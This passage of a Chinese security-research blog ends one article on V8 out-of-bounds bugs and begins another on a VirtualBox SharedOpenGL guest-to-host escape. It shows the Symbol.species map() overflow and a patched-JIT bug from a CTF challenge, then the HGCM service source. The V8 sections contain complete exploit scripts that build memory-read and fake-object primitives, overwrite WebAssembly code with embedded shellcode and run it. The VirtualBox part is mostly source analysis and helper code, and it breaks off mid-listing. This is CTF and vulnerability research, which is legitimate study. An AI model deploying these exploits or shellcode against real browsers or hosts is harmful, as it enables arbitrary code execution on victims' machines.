[Symbol.species]() &#123;      return Array;  &#125;&#125;a = new MyArray(1.1,2.2);var b = a.map(function(x) &#123;return x+1&#125;);%DebugPrint(b);\n其中\nstatic get [Symbol.species]()\n是固定写法，该函数返回一个类型，那么下一步回调结束，程序就会从Array类里调用构造函数，从而创建了一个Array的对象，假如代码改为如下\nclass Array1 extends Array &#123;  constructor(len) &#123;      print(&quot;len=&quot; + len);      super(len);    &#125;&#125;;class MyArray extends Array &#123;  static get [Symbol.species]() &#123;      return Array1;  &#125;&#125;a = new MyArray(1.1,2.2);var b = a.map(function(x) &#123;return x+1&#125;);%DebugPrint(b);\n由于static get [Symbol.species]()返回了Array1，因此map时会从Array1里调用构造函数，此时，我们可以控制super()函数里的参数，如下\nlass Array1 extends Array &#123;  constructor(len) &#123;      super(1);    &#125;&#125;;class MyArray extends Array &#123;  static get [Symbol.species]() &#123;      return Array1;  &#125;&#125;a = new MyArray(1.1,2.2);var b = a.map(function(x) &#123;return x+1&#125;);%DebugPrint(b);\n但是最后映射结果的时候，仍然使用的之前的len，因此在进行函数映射时，由于没有检查用于存放结果的数组的长度，便发生了越界写。\n  Node* result =      CallStub(slow_case_continuation, context(), receiver(), callbackfn(),               this_arg(), a_.value(), o(), k_.value(), len(), to_.value());Node* len() &#123; return len_; &#125;\n漏洞利用既然能越界写，那么我们就越界覆盖后方Array对象的length，进而构造一个oob的arr，然后利用手法就和前面一样了。exp\nvar buf = new ArrayBuffer(0x8);var dv = new DataView(buf);function p64f(value1,value2) &#123;   dv.setUint32(0,value1,true);   dv.setUint32(0x4,value2,true);   return dv.getFloat64(0,true);&#125;function u64_l(value) &#123;   dv.setFloat64(0,value,true);   return dv.getUint32(0,true);&#125;function u64_h(value) &#123;   dv.setFloat64(0,value,true);   return dv.getUint32(4,true);&#125;var obj = &#123;&#125;;var oob_double_arr;var obj_arr;var arb_buf;class Array1 extends Array &#123;  constructor(len) &#123;      super(1); //将数组长度缩减为1      oob_double_arr = [1.1,2.2];      obj_arr = [obj];      arb_buf = new ArrayBuffer(0x10);    &#125;&#125;;class MyArray extends Array &#123;  static get [Symbol.species]() &#123;      return Array1;    &#125;&#125;a = new MyArray();//第8个位置将会写入数据a[8] = 0x1;//OOBvar b = a.map(function(x) &#123; return 1000; &#125;);var array_buffer_map = oob_double_arr[0xe];function addressOf(obj) &#123;   obj_arr[0] = obj;   var addr = oob_double_arr[0xd];   return addr;&#125;function fakeObject(addr_h,addr_l) &#123;   oob_double_arr[0xd] = p64f(addr_l,addr_h);   var mobj = obj_arr[0];   return mobj;&#125;const wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);const shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);var wasmModule = new WebAssembly.Module(wasmCode);var wasmInstance = new WebAssembly.Instance(wasmModule);var func = wasmInstance.exports.main;var d = addressOf(func);var wasm_shellcode_ptr_addr_h = u64_h(d);var wasm_shellcode_ptr_addr_l = u64_l(d) - 0x1 + 0x38;oob_double_arr[0x11] = p64f(0,0xffff);oob_double_arr[0x12] = p64f(wasm_shellcode_ptr_addr_l,wasm_shellcode_ptr_addr_h);var adv = new DataView(arb_buf);var wasm_shellcode_addr_l = adv.getUint32(0,true);var wasm_shellcode_addr_h = adv.getUint32(4,true);print(&#x27;wasm_shellcode_addr=&#x27; + wasm_shellcode_addr_h.toString(16) + wasm_shellcode_addr_l.toString(16));oob_double_arr[0x12] = p64f(wasm_shellcode_addr_l,wasm_shellcode_addr_h);//替换wasm的shellcodefor (var i=0;i&lt;shellcode.length;i++) &#123;   adv.setUint32(i*4,shellcode[i],true);&#125;//执行shellcodefunc();\n0x04 JIT中的OOB0x04.00 qwb2019-final-groupupjspatch分析diff --git a/src/compiler/machine-operator-reducer.cc b/src/compiler/machine-operator-reducer.ccindex a6a8e87cf4..164ab44fab 100644--- a/src/compiler/machine-operator-reducer.cc+++ b/src/compiler/machine-operator-reducer.cc@@ -291,7 +291,7 @@ Reduction MachineOperatorReducer::Reduce(Node* node) &#123;       if (m.left().Is(kMaxUInt32)) return ReplaceBool(false);  // M &lt; x =&gt; false       if (m.right().Is(0)) return ReplaceBool(false);          // x &lt; 0 =&gt; false       if (m.IsFoldable()) &#123;                                    // K &lt; K =&gt; K-        return ReplaceBool(m.left().Value() &lt; m.right().Value());+        return ReplaceBool(m.left().Value() &lt; m.right().Value() + 1);       &#125;       if (m.LeftEqualsRight()) return ReplaceBool(false);  // x &lt; x =&gt; false       if (m.left().IsWord32Sar() &amp;&amp; m.right().HasValue()) &#123;\n该patch打在MachineOperatorReducer::Reduce函数中，可以推测这个漏洞与JIT编译器有关。JIT中的IR优化流程如下其中MachineOperatorReducer发生在Reduce阶段也就是图中SimplifiedLoweringPhase阶段，MachineOperatorReducer::Reduce会将IR中间代码中的一些可以在编译时就计算出的条件直接优化为一个布尔值。而我们的patch正好打在了IrOpcode::kInt32LessThan分支，也就是如果IR代码中有kInt32LessThan的代码调用，将会出现问题，可以溢出一个单位。而数组的length则是Int32类型，尝试写出如下的测试代码\nfunction opt(x) &#123;   var a = [1.1,2.2,3.3,4.4];   return a[4];&#125;for (var i=0;i&lt;0x20000;i++) &#123;   opt(i);&#125;print(opt(i));\n发现并没有发生溢出，为了追踪优化过程，我们v8自带的Turbolizer来查看v8生成的IR图，执行\n./d8 1.js --trace-turbo --trace-turbo-path ../\n生成IR图，然后用Turbolizer打开查看发现其在LoadElimination Phase阶段，直接使用CheckBounds来进行检查了，也就是还未到达SimplifiedLoweringPhase阶段时，JIT就已经知道这个为越界的访问。因此，我们可以将4包裹在一个字典对象里，这样在LoadElimination Phase阶段，JIT就不知道越界了，因为后面还要进行Escape Analyse才能知道值。于是代码修改为这样\nfunction opt(x) &#123;   var a = [1.1,2.2,3.3,4.4];   var e = &#123;a:4&#125;   return a[e.a];&#125;for (var i=0;i&lt;0x20000;i++) &#123;   opt(i);&#125;print(opt(i));\n可以发现输出了一个double值\nroot@ubuntu:~/Desktop/qwb2019-final-groupupjs/x64.debug# ./d8 1.js --trace-turbo --trace-turbo-path ../Concurrent recompilation has been disabled for tracing.---------------------------------------------------Begin compiling method opt using TurboFan---------------------------------------------------Finished compiling method opt using TurboFan---------------------------------------------------Begin compiling method  using TurboFan---------------------------------------------------Finished compiling method  using TurboFan-1.1885946300594787e+148\n这回由于信息不足，不能在LoadElimination Phase阶段确定，因此仅检查了最大范围然后在SimplifiedLoweringPhase阶段，用了Uint32LessThan，由于Uint32LessThan被patch过，因此结果为True，那么就可以越界访问了。\n漏洞利用构造出一个oob数组后，改写数组对象的MAP，然后构造addressOf和fakeObject原语。exp\nvar buf = new ArrayBuffer(0x8);var dv = new DataView(buf);function p64f(value1,value2) &#123;   dv.setUint32(0,value1,true);   dv.setUint32(0x4,value2,true);   return dv.getFloat64(0,true);&#125;function i2f64(value) &#123;   dv.setBigUint64(0,BigInt(value),true);   return dv.getFloat64(0,true);&#125;function u64f(value) &#123;   dv.setFloat64(0,value,true);   return dv.getBigUint64(0,true);&#125;var arr;var obj_arr;function opt()&#123;   arr = [1.1,2.2,3.3,4.4];   obj_arr = [arr];   var e = &#123;a:arr.length&#125;;   return arr[e.a];&#125;for(var i=0; i &lt; 0x20000; i++)&#123;    opt();&#125;var double_element_map = opt();//print(u64f(double_element_map).toString(16));var obj_element_map = i2f64(u64f(double_element_map) + 0xa0n);print((u64f(double_element_map)).toString(16));function fakeObject_opt(addr) &#123;   arr = [addr,2.2,3.3,4.4];   var e = &#123;a:arr.length&#125;;   arr[e.a] = obj_element_map;   return arr;&#125;//JIT优化for (var i=0;i&lt;0x20000;i++) &#123;   fakeObject_opt(double_element_map);&#125;function fakeObject(addr) &#123;   return fakeObject_opt(i2f64(addr + 0x1n))[0];&#125;//获得MAP对象var double_element_map_obj = fakeObject_opt(double_element_map)[0];//print(double_element_map_obj);function addressOf_opt(obj) &#123;   var arr = [obj,obj,obj,obj];   var e = &#123;a:arr.length&#125;;   arr[e.a] = double_element_map_obj;   return arr;&#125;//JIT优化for (var i=0;i&lt;0x20000;i++) &#123;   addressOf_opt(buf);&#125;function addressOf(obj) &#123;   var v = addressOf_opt(obj)[0];   return u64f(v) - 0x1n;&#125;const wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);const shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);var wasmModule = new WebAssembly.Module(wasmCode);var wasmInstance = new WebAssembly.Instance(wasmModule);var func = wasmInstance.exports.main;var faker = [0.0,1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9];var arb_buf = new ArrayBuffer(0x10);var faker_addr = addressOf(faker);print(&#x27;faker_addr=&#x27;+faker_addr.toString(16));wasm_shellcode_ptr_addr = addressOf(wasmInstance) + 0x88n;var element_addr = faker_addr - 0x60n;print(&#x27;element_addr=&#x27; + element_addr.toString(16));//fake a FixedDoubleArrayfaker[0] = double_element_map;faker[1] = i2f64(0n);faker[2] = i2f64(element_addr+0x1n);faker[3] = i2f64(0x300000000000n);var oob_arr = fakeObject(element_addr + 0x10n);oob_arr[0x11] = i2f64(0x1000n); //修改ArrayBuffer的lengthoob_arr[0x12] = i2f64(wasm_shellcode_ptr_addr);var adv = new DataView(arb_buf);var wasm_shellcode_addr = adv.getBigUint64(0,true);print(&#x27;wasm_shellcode_addr=&#x27; + wasm_shellcode_addr.toString(16));oob_arr[0x12] = i2f64(wasm_shellcode_addr);//替换wasm的shellcodefor (var i=0;i&lt;shellcode.length;i++) &#123;   adv.setUint32(i*4,shellcode[i],true);&#125;//%SystemBreak();//执行shellcodefunc();\n0x05 感想oob类型的v8漏洞，其利用手法大多相似，不同点在于如何构造出oob数组。从一开始的直入主题到一般情况再到回调函数中的oob以及JIT中的oob，收获了许多知识。\n","categories":["CTF","安全研究"],"tags":["JS引擎漏洞","类型混淆"]},{"title":"VirtualBox虚拟机逃逸之SharedOpenGL模块","url":"/2021/05/06/virtualbox-SharedOpenGL/","content":"文章首发于安全KER https://www.anquanke.com/post/id/239241\n0x00 前言最近研究VirtualBox虚拟机逃逸，前面分析了VirtualBox的HGCM通信协议，本文我们基于HGCM协议与SharedOpenGL模块进行通信，并分析SharedOpenGL中使用的chromium协议，复现SharedOpenGL中出现的历史漏洞从而进行虚拟机逃逸。\n0x01 前置知识chromium协议引言我们使用HGCM通信协议，可以在Guest中与主机的一些服务进行通信，其中有一个服务名为SharedOpenGL，这是一个用于3D加速的服务，首先主机中的VirtualBox需要开启3D加速才能在Guest中进行调用在src\\VBox\\GuestHost\\OpenGL目录下，是位于Guest中的组件源码，该组件在Guest中通过HGCM协议与Host中的SharedOpenGL进行连接，然后使用了他们之间的一套新的协议（称之为“chromium协议”）来进行数据交换，对于src\\VBox\\GuestHost\\OpenGL，我们不用去分析其实现，因为它就是一个相当于客户端一样的东西，我们重点分析Host中的SharedOpenGL。\n首先看到src\\VBox\\HostServices\\SharedOpenGL\\crserver\\crservice.cpp源文件中的svcCall函数，前面介绍过，这是HGCM对SharedOpenGL模块的函数调用入口。\nsvcCallstatic DECLCALLBACK(void) svcCall (void *, VBOXHGCMCALLHANDLE callHandle, uint32_t u32ClientID, void *pvClient,                                   uint32_t u32Function, uint32_t cParms, VBOXHGCMSVCPARM paParms[], uint64_t tsArrival)&#123;..................................................    switch (u32Function)    &#123;        case SHCRGL_GUEST_FN_WRITE:        &#123;..................................                /* Fetch parameters. */                uint8_t *pBuffer  = (uint8_t *)paParms[0].u.pointer.addr;                uint32_t cbBuffer = paParms[0].u.pointer.size;                /* Execute the function. */                rc = crVBoxServerClientWrite(u32ClientID, pBuffer, cbBuffer);...................................            break;        &#125;        case SHCRGL_GUEST_FN_INJECT:        &#123;.......................................                /* Fetch parameters. */                uint32_t u32InjectClientID = paParms[0].u.uint32;                uint8_t *pBuffer  = (uint8_t *)paParms[1].u.pointer.addr;                uint32_t cbBuffer = paParms[1].u.pointer.size;                /* Execute the function. */                rc = crVBoxServerClientWrite(u32InjectClientID, pBuffer, cbBuffer);.................................            break;        &#125;        case SHCRGL_GUEST_FN_READ:        &#123;...........................................            /* Fetch parameters. */            uint8_t *pBuffer  = (uint8_t *)paParms[0].u.pointer.addr;            uint32_t cbBuffer = paParms[0].u.pointer.size;            /* Execute the function. */            rc = crVBoxServerClientRead(u32ClientID, pBuffer, &amp;cbBuffer);.....................................................            break;        &#125;        case SHCRGL_GUEST_FN_WRITE_READ:        &#123;..................................................                /* Fetch parameters. */                uint8_t *pBuffer     = (uint8_t *)paParms[0].u.pointer.addr;                uint32_t cbBuffer    = paParms[0].u.pointer.size;                uint8_t *pWriteback  = (uint8_t *)paParms[1].u.pointer.addr;                uint32_t cbWriteback = paParms[1].u.pointer.size;                /* Execute the function. */                rc = crVBoxServerClientWrite(u32ClientID, pBuffer, cbBuffer);                if (!RT_SUCCESS(rc))                &#123;                    Assert(VERR_NOT_SUPPORTED==rc);                    svcClientVersionUnsupported(0, 0);                &#125;                rc = crVBoxServerClientRead(u32ClientID, pWriteback, &amp;cbWriteback);...........................................            break;        &#125;        case SHCRGL_GUEST_FN_SET_VERSION:        &#123;.........................................                /* Fetch parameters. */                uint32_t vMajor    = paParms[0].u.uint32;                uint32_t vMinor    = paParms[1].u.uint32;                /* Execute the function. */                rc = crVBoxServerClientSetVersion(u32ClientID, vMajor, vMinor);................................            break;        &#125;        case SHCRGL_GUEST_FN_SET_PID:        &#123;  ................................                /* Fetch parameters. */                uint64_t pid    = paParms[0].u.uint64;                /* Execute the function. */                rc = crVBoxServerClientSetPID(u32ClientID, pid);.........................            break;        &#125;        case SHCRGL_GUEST_FN_WRITE_BUFFER:        &#123;..................................                /* Fetch parameters. */                uint32_t iBuffer      = paParms[0].u.uint32;                uint32_t cbBufferSize = paParms[1].u.uint32;                uint32_t ui32Offset   = paParms[2].u.uint32;                uint8_t *pBuffer      = (uint8_t *)paParms[3].u.pointer.addr;                uint32_t cbBuffer     = paParms[3].u.pointer.size;                /* Execute the function. */                CRVBOXSVCBUFFER_t *pSvcBuffer = svcGetBuffer(iBuffer, cbBufferSize);                if (!pSvcBuffer || ((uint64_t)ui32Offset+cbBuffer)&gt;cbBufferSize)                &#123;                    rc = VERR_INVALID_PARAMETER;                &#125;                else                &#123;                    memcpy((void*)((uintptr_t)pSvcBuffer-&gt;pData+ui32Offset), pBuffer, cbBuffer);                    /* Return the buffer id */                    paParms[0].u.uint32 = pSvcBuffer-&gt;uiId;......................            break;        &#125;        case SHCRGL_GUEST_FN_WRITE_READ_BUFFERED:        &#123; .................................                /* Fetch parameters. */                uint32_t iBuffer = paParms[0].u.uint32;                uint8_t *pWriteback  = (uint8_t *)paParms[1].u.pointer.addr;                uint32_t cbWriteback = paParms[1].u.pointer.size;                CRVBOXSVCBUFFER_t *pSvcBuffer = svcGetBuffer(iBuffer, 0);                if (!pSvcBuffer)                &#123;                    LogRel((&quot;OpenGL: svcCall(WRITE_READ_BUFFERED): Invalid buffer (%d)\\n&quot;, iBuffer));                    rc = VERR_INVALID_PARAMETER;                    break;                &#125;                uint8_t *pBuffer     = (uint8_t *)pSvcBuffer-&gt;pData;                uint32_t cbBuffer    = pSvcBuffer-&gt;uiSize;                /* Execute the function. */                rc = crVBoxServerClientWrite(u32ClientID, pBuffer, cbBuffer);                if (!RT_SUCCESS(rc))                &#123;                    Assert(VERR_NOT_SUPPORTED==rc);                    svcClientVersionUnsupported(0, 0);                &#125;                rc = crVBoxServerClientRead(u32ClientID, pWriteback, &amp;cbWriteback);                if (RT_SUCCESS(rc))                &#123;                    /* Update parameters.*/                    paParms[1].u.pointer.size = cbWriteback;                &#125;                /* Return the required buffer size always */                paParms[2].u.uint32 = cbWriteback;                svcFreeBuffer(pSvcBuffer);            &#125;            break;        &#125;\n从上面的源码我们可以知道\n\nThat sequence can be performed by the Chromium client indifferent ways:\n\n\nSingle-step: send the rendering commands and receive theresulting frame buffer with one single message.\nTwo-step: send a message with the rendering commandsand let the server interpret them, then send anothermessage requesting the resulting frame buffer.\nBuffered: send the rendering commands and let the serverstore them in a buffer without interpreting it, then send asecond message to make the server interpret the bufferedcommands and return the resulting frame buffer.\n\nGuest中的客户端会通过HGCM发送一连串的命令到SharedOpenGL服务中被解析并返回图形渲染的结果给Guest。其中我们注意到SHCRGL_GUEST_FN_WRITE_BUFFER分支\nSHCRGL_GUEST_FN_WRITE_BUFFER/* Execute the function. */CRVBOXSVCBUFFER_t *pSvcBuffer = svcGetBuffer(iBuffer, cbBufferSize);\n进入svcGetBuffer函数\nstatic CRVBOXSVCBUFFER_t* svcGetBuffer(uint32_t iBuffer, uint32_t cbBufferSize)&#123;    CRVBOXSVCBUFFER_t* pBuffer;    if (iBuffer)    &#123;...........................    &#125;    else /*allocate new buffer*/    &#123;        pBuffer = (CRVBOXSVCBUFFER_t*) RTMemAlloc(sizeof(CRVBOXSVCBUFFER_t));        if (pBuffer)        &#123;            pBuffer-&gt;pData = RTMemAlloc(cbBufferSize);.........................\n其中我们注意到当参数iBuffer为0时，会申请两个堆RTMemAlloc(sizeof(CRVBOXSVCBUFFER_t))和RTMemAlloc(cbBufferSize)，由于参数是可以自由控制的，因此通过该功能，我们可以自由的申请堆块，在Heap Spray中，这个非常有用。通过分析，SHCRGL_GUEST_FN_WRITE_BUFFER命令的功能就是从Guset中接收一串数据，并存入Buffer中，如果Buffer不存在则创建一个新的我们将这个过程封装为函数用于使用\nint alloc_buf(int client,int size,const char *msg,int msg_len) &#123;   int rc = hgcm_call(client,SHCRGL_GUEST_FN_WRITE_BUFFER,&quot;%u%u%u%b&quot;,0,size,0,&quot;in&quot;,msg,msg_len);   if (rc) &#123;      die(&quot;[-] alloc_buf error&quot;);   &#125;   return ans_buf[0];&#125;\nSHCRGL_GUEST_FN_WRITE_READ_BUFFERED接下来我们看到SHCRGL_GUEST_FN_WRITE_READ_BUFFERED命令,首先是该命令需要3个参数\n/* Verify parameter count and types. */if (cParms != SHCRGL_CPARMS_WRITE_READ_BUFFERED)&#123;    rc = VERR_INVALID_PARAMETER;&#125;elseif (    paParms[0].type != VBOX_HGCM_SVC_PARM_32BIT   /* iBufferID */     || paParms[1].type != VBOX_HGCM_SVC_PARM_PTR     /* pWriteback */     || paParms[2].type != VBOX_HGCM_SVC_PARM_32BIT   /* cbWriteback */     || !paParms[0].u.uint32 /*iBufferID can&#x27;t be 0 here*/   )&#123;    rc = VERR_INVALID_PARAMETER;&#125;\n第一个为iBufferID，也就是通过SHCRGL_GUEST_FN_WRITE_BUFFER命令创建的buffer对应的ID；第二个参数为pWriteback，是一个指针，用于在Guest中接收处理后的数据；第三个参数为cbWriteback表示数据长度。我们将调用封装为函数用于使用\nchar crmsg_buf[0x1000];int crmsg(int client,const char *msg,int msg_len) &#123;   int buf_id = alloc_buf(client,0x1000,msg,msg_len);   int rc = hgcm_call(client,SHCRGL_GUEST_FN_WRITE_READ_BUFFERED,&quot;%u%b%u&quot;,buf_id,&quot;out&quot;,crmsg_buf,0x1000,0x1000);   if (rc) &#123;      die(&quot;[-] crmsg error&quot;);   &#125;&#125;\n为了便于分析，我们写了一个测试程序\nint main() &#123;   int idClient = hgcm_connect(&quot;VBoxSharedCrOpenGL&quot;);   printf(&quot;idClient=%d\\n&quot;,idClient);   set_version(idClient);   crmsg(idClient,&quot;hello&quot;,0x6);&#125;\n这里我们简单的发送hello到host中，看看会发生什么。继续向下看\nCRVBOXSVCBUFFER_t *pSvcBuffer = svcGetBuffer(iBuffer, 0);if (!pSvcBuffer)&#123;    LogRel((&quot;OpenGL: svcCall(WRITE_READ_BUFFERED): Invalid buffer (%d)\\n&quot;, iBuffer));    rc = VERR_INVALID_PARAMETER;    break;&#125;uint8_t *pBuffer     = (uint8_t *)pSvcBuffer-&gt;pData;uint32_t cbBuffer    = pSvcBuffer-&gt;uiSize;/* Execute the function. */rc = crVBoxServerClientWrite(u32ClientID, pBuffer, cbBuffer);\n通过iBuffer索引获取到了pBuffer以后，传入crVBoxServerClientWrite函数进行处理，我们进入该函数。\nint32_t crVBoxServerClientWrite(uint32_t u32ClientID, uint8_t *pBuffer, uint32_t cbBuffer)&#123;    CRClient *pClient=NULL;    int32_t rc = crVBoxServerClientGet(u32ClientID, &amp;pClient);\n该函数首先调用crVBoxServerClientGet获取服务句柄\nint32_t crVBoxServerClientGet(uint32_t u32ClientID, CRClient **ppClient)&#123;    CRClient *pClient = NULL;    pClient = crVBoxServerClientById(u32ClientID);    if (!pClient)    &#123;        WARN((&quot;client not found!&quot;));        *ppClient = NULL;        return VERR_INVALID_PARAMETER;    &#125;    if (!pClient-&gt;conn-&gt;vMajor)    &#123;        WARN((&quot;no major version specified for client!&quot;));        *ppClient = NULL;        return VERR_NOT_SUPPORTED;    &#125;\n在crVBoxServerClientGet函数中，会判断pClient-&gt;conn-&gt;vMajor，如果没有设置则报错。该字段是在svcCall中的SHCRGL_GUEST_FN_SET_VERSION命令中被设置的\n        case SHCRGL_GUEST_FN_SET_VERSION:        &#123;...........                /* Fetch parameters. */                uint32_t vMajor    = paParms[0].u.uint32;                uint32_t vMinor    = paParms[1].u.uint32;                /* Execute the function. */                rc = crVBoxServerClientSetVersion(u32ClientID, vMajor, vMinor);\n因此，在我们使用SHCRGL_GUEST_FN_WRITE_BUFFER之前，应该先使用SHCRGL_GUEST_FN_SET_VERSION设置一下版本\nint set_version(int client) &#123;   int rc = hgcm_call(client,SHCRGL_GUEST_FN_SET_VERSION,&quot;%u%u&quot;,CR_PROTOCOL_VERSION_MAJOR,CR_PROTOCOL_VERSION_MINOR);   if (rc) &#123;      die(&quot;[-] set_version error&quot;);   &#125;   return 0;&#125;\n当int32_t rc = crVBoxServerClientGet(u32ClientID, &amp;pClient);执行完获取到服务句柄以后，就继续调用crVBoxServerInternalClientWriteRead函数\n    pClient-&gt;conn-&gt;pBuffer = pBuffer;    pClient-&gt;conn-&gt;cbBuffer = cbBuffer;#ifdef VBOX_WITH_CRHGSMI    CRVBOXHGSMI_CMDDATA_ASSERT_CLEANED(&amp;pClient-&gt;conn-&gt;CmdData);#endif    crVBoxServerInternalClientWriteRead(pClient);    return VINF_SUCCESS;&#125;\ncrVBoxServerInternalClientWriteRead函数如下\nstatic void crVBoxServerInternalClientWriteRead(CRClient *pClient)&#123;............................    crNetRecv();    CRASSERT(pClient-&gt;conn-&gt;pBuffer==NULL &amp;&amp; pClient-&gt;conn-&gt;cbBuffer==0);    CRVBOXHGSMI_CMDDATA_ASSERT_CLEANED(&amp;pClient-&gt;conn-&gt;CmdData);    crServerServiceClients();    crStateResetCurrentPointers(&amp;cr_server.current);..............\n先是调用了crNetRecv函数，经过调试，调用链如下\npwndbg&gt; k#0  0x00007f1b3db9ff05 in _crVBoxHGCMReceiveMessage (conn=0x7f1b1cf408c0) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/GuestHost/OpenGL/util/vboxhgcm.c:1091#1  0x00007f1b3dba13cc in _crVBoxHGCMPerformReceiveMessage (conn=0x7f1b1cf408c0) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/GuestHost/OpenGL/util/vboxhgcm.c:2425#2  0x00007f1b3dba141c in crVBoxHGCMRecv () at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/GuestHost/OpenGL/util/vboxhgcm.c:2482#3  0x00007f1b3db80238 in crNetRecv () at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/GuestHost/OpenGL/util/net.c:1307#4  0x00007f1b3ddea7b4 in crVBoxServerInternalClientWriteRead (pClient=0x7f1b1d04da10) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/HostServices/SharedOpenGL/crserverlib/server_main.c:754#5  0x00007f1b3ddeacb1 in crVBoxServerClientWrite (u32ClientID=35, pBuffer=0x7f1b1d04e3f0 &quot;hello&quot;, cbBuffer=4096) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/HostServices/SharedOpenGL/crserverlib/server_main.c:792#6  0x00007f1b3ddce7c7 in svcCall (callHandle=0x7f1b34c93f50, u32ClientID=35, pvClient=0x7f1b3000a7e0, u32Function=14, cParms=3, paParms=0x7f1b5452d560, tsArrival=29122886987445) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/HostServices/SharedOpenGL/crserver/crservice.cpp:740#7  0x00007f1b6e30325a in hgcmServiceThread (pThread=0x7f1b30003c70, pvUser=0x7f1b30003b10) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/Main/src-client/HGCM.cpp:708#8  0x00007f1b6e300090 in hgcmWorkerThreadFunc (hThreadSelf=0x7f1b30004050, pvUser=0x7f1b30003c70) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/Main/src-client/HGCMThread.cpp:200#9  0x00007f1b8ae47aff in rtThreadMain (pThread=0x7f1b30004050, NativeThread=139754983003904, pszThreadName=0x7f1b30004930 &quot;ShCrOpenGL&quot;) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/Runtime/common/misc/thread.cpp:719#10 0x00007f1b8af8e098 in rtThreadNativeMain (pvArgs=0x7f1b30004050) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/Runtime/r3/posix/thread-posix.cpp:327#11 0x00007f1b859da6ba in start_thread (arg=0x7f1b3e1e1700) at pthread_create.c:333#12 0x00007f1b87fd84dd in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:109\n可以知道该函数位于src/VBox/GuestHost/OpenGL/util/net.c源文件，虽然这里位于Guset中的客户端源码，但其实是同样编译了一份给Host用\npwndbg&gt; p crNetRecv$2 = &#123;int (void)&#125; 0x7f1b3db80208 &lt;crNetRecv&gt;pwndbg&gt; vmmap 0x7f1b3db80208LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA    0x7f1b3db6d000     0x7f1b3dbb3000 r-xp    46000 0      /home/sea/Desktop/VirtualBox-6.0.0/out/linux.amd64/debug/bin/VBoxOGLhostcrutil.so +0x13208pwndbg&gt; \n可以知道其在VBoxOGLhostcrutil.so库中，从调用链可以知道最终调用到_crVBoxHGCMReceiveMessage这里会出现问题\nstatic void _crVBoxHGCMReceiveMessage(CRConnection *conn)&#123;    uint32_t len;    CRVBOXHGCMBUFFER *hgcm_buffer;    CRMessage *msg;    CRMessageType cached_type;    len = conn-&gt;cbBuffer;    CRASSERT(len &gt; 0);    CRASSERT(conn-&gt;pBuffer);#ifndef IN_GUEST    /* Expect only CR_MESSAGE_OPCODES from the guest. */    AssertPtrReturnVoid(conn-&gt;pBuffer);    if (   conn-&gt;cbBuffer &gt;= sizeof(CRMessageHeader)        &amp;&amp; ((CRMessageHeader*) (conn-&gt;pBuffer))-&gt;type == CR_MESSAGE_OPCODES)    &#123;        /* Looks good. */    &#125;    else    &#123;        AssertFailed();        /** @todo Find out if this is the expected cleanup. */        conn-&gt;cbBuffer = 0;        conn-&gt;pBuffer  = NULL;        return;    &#125;#endif\n这里会将我们传入的数据转换为CRMessageHeader结构体，然后判断type是否为CR_MESSAGE_OPCODES，如果不是，则报错\ntypedef struct &#123;    CRMessageType          type;    unsigned int           conn_id;&#125; CRMessageHeader;\n由此可见，我们的数据必须符合要求，当检查通过以后\n#ifndef IN_GUEST    if (conn-&gt;allow_redir_ptr)    &#123;#endif        CRASSERT(conn-&gt;buffer_size &gt;= sizeof(CRMessageRedirPtr));        hgcm_buffer = (CRVBOXHGCMBUFFER *) _crVBoxHGCMAlloc( conn ) - 1;        hgcm_buffer-&gt;len = sizeof(CRMessageRedirPtr);        msg = (CRMessage *) (hgcm_buffer + 1);        msg-&gt;header.type = CR_MESSAGE_REDIR_PTR;        msg-&gt;redirptr.pMessage = (CRMessageHeader*) (conn-&gt;pBuffer);        msg-&gt;header.conn_id = msg-&gt;redirptr.pMessage-&gt;conn_id;#if defined(VBOX_WITH_CRHGSMI) 